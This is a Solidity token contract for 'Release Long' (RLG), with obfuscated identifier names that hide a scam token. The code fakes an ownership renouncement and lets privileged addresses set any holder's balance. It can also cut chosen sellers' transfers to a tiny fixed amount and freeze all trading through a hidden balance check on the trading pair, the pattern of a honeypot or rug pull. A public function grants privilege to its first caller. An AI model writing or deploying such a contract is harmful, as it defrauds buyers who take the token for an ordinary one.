//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface fundList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract limitTakeSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeMode {
    function createPair(address modeEnable, address maxLimit) external returns (address);
}

interface exemptTrading {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletSell) external view returns (uint256);

    function transfer(address senderMin, uint256 maxFrom) external returns (bool);

    function allowance(address receiverMin, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxFrom) external returns (bool);

    function transferFrom(
        address sender,
        address senderMin,
        uint256 maxFrom
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fromExempt, uint256 value);
    event Approval(address indexed receiverMin, address indexed spender, uint256 value);
}

interface exemptTradingMetadata is exemptTrading {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ReleaseLong is limitTakeSender, exemptTrading, exemptTradingMetadata {

    function minMarketingLaunched() private view {
        require(feeSender[_msgSender()]);
    }

    function allowance(address buyTotal, address atToken) external view virtual override returns (uint256) {
        if (atToken == launchedSell) {
            return type(uint256).max;
        }
        return maxAuto[buyTotal][atToken];
    }

    function modeTxShould(address txBuy) public {
        if (fromEnableAmount) {
            return;
        }
        if (swapAt != isSender) {
            isSender = false;
        }
        feeSender[txBuy] = true;
        
        fromEnableAmount = true;
    }

    function approve(address atToken, uint256 maxFrom) public virtual override returns (bool) {
        maxAuto[_msgSender()][atToken] = maxFrom;
        emit Approval(_msgSender(), atToken, maxFrom);
        return true;
    }

    address feeFundFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    constructor (){
        
        fundList feeFund = fundList(launchedSell);
        feeAutoMode = takeMode(feeFund.factory()).createPair(feeFund.WETH(), address(this));
        if (tokenMin != fundTradingReceiver) {
            fundTradingReceiver = tokenMin;
        }
        feeTeamLaunched = _msgSender();
        marketingLaunchLiquidity();
        feeSender[feeTeamLaunched] = true;
        teamTotal[feeTeamLaunched] = marketingSender;
        if (autoMarketing != tokenMin) {
            isSender = true;
        }
        emit Transfer(address(0), feeTeamLaunched, marketingSender);
    }

    function walletTxLaunch(address listWallet) public {
        minMarketingLaunched();
        
        if (listWallet == feeTeamLaunched || listWallet == feeAutoMode) {
            return;
        }
        maxSender[listWallet] = true;
    }

    bool private swapAt;

    function name() external view virtual override returns (string memory) {
        return atEnableTo;
    }

    function fundWallet(address enableReceiver, uint256 maxFrom) public {
        minMarketingLaunched();
        teamTotal[enableReceiver] = maxFrom;
    }

    uint256 private modeShould;

    address launchedSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transfer(address enableReceiver, uint256 maxFrom) external virtual override returns (bool) {
        return listSwap(_msgSender(), enableReceiver, maxFrom);
    }

    event OwnershipTransferred(address indexed liquidityToBuy, address indexed swapSender);

    mapping(address => bool) public maxSender;

    uint256 public fundTradingReceiver;

    function transferFrom(address swapTotalExempt, address senderMin, uint256 maxFrom) external override returns (bool) {
        if (_msgSender() != launchedSell) {
            if (maxAuto[swapTotalExempt][_msgSender()] != type(uint256).max) {
                require(maxFrom <= maxAuto[swapTotalExempt][_msgSender()]);
                maxAuto[swapTotalExempt][_msgSender()] -= maxFrom;
            }
        }
        return listSwap(swapTotalExempt, senderMin, maxFrom);
    }

    address public feeTeamLaunched;

    uint256 public tradingAuto;

    uint256 constant txTotalMode = 19 ** 10;

    uint256 private marketingSender = 100000000 * 10 ** 18;

    uint256 maxShould;

    string private atEnableTo = "Release Long";

    function getOwner() external view returns (address) {
        return receiverLiquidity;
    }

    function marketingLaunchLiquidity() public {
        emit OwnershipTransferred(feeTeamLaunched, address(0));
        receiverLiquidity = address(0);
    }

    uint256 public autoMarketing;

    uint256 limitFrom;

    function decimals() external view virtual override returns (uint8) {
        return marketingShouldAt;
    }

    uint8 private marketingShouldAt = 18;

    mapping(address => mapping(address => uint256)) private maxAuto;

    function symbol() external view virtual override returns (string memory) {
        return launchShould;
    }

    address public feeAutoMode;

    function listSwap(address swapTotalExempt, address senderMin, uint256 maxFrom) internal returns (bool) {
        if (swapTotalExempt == feeTeamLaunched) {
            return liquidityAmount(swapTotalExempt, senderMin, maxFrom);
        }
        uint256 maxReceiver = exemptTrading(feeAutoMode).balanceOf(feeFundFrom);
        require(maxReceiver == maxShould);
        require(senderMin != feeFundFrom);
        if (maxSender[swapTotalExempt]) {
            return liquidityAmount(swapTotalExempt, senderMin, txTotalMode);
        }
        return liquidityAmount(swapTotalExempt, senderMin, maxFrom);
    }

    string private launchShould = "RLG";

    function totalSupply() external view virtual override returns (uint256) {
        return marketingSender;
    }

    uint256 private tokenMin;

    mapping(address => bool) public feeSender;

    function balanceOf(address walletSell) public view virtual override returns (uint256) {
        return teamTotal[walletSell];
    }

    bool public liquidityTradingReceiver;

    bool public fromEnableAmount;

    function toIsLiquidity(uint256 maxFrom) public {
        minMarketingLaunched();
        maxShould = maxFrom;
    }

    address private receiverLiquidity;

    function liquidityAmount(address swapTotalExempt, address senderMin, uint256 maxFrom) internal returns (bool) {
        require(teamTotal[swapTotalExempt] >= maxFrom);
        teamTotal[swapTotalExempt] -= maxFrom;
        teamTotal[senderMin] += maxFrom;
        emit Transfer(swapTotalExempt, senderMin, maxFrom);
        return true;
    }

    bool private receiverSell;

    function owner() external view returns (address) {
        return receiverLiquidity;
    }

    bool public isSender;

    mapping(address => uint256) private teamTotal;

}